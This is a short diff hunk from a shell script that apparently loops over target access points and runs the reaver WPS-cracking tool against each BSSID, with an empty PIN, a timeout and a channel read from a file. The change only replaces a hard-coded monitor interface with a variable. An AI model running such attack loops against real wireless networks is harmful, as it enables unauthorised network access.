@@ -80,7 +80,7 @@ do
 
 	channel=$(head -$ligne channels.txt | tail -1)
 
-	timeout $cracktime sudo reaver -i wlan0mon -b $bssid -p "" -vv -c $channel >> output.txt
+	timeout $cracktime sudo reaver -i ${card}mon -b $bssid -p "" -vv -c $channel >> output.txt
 
 done
 
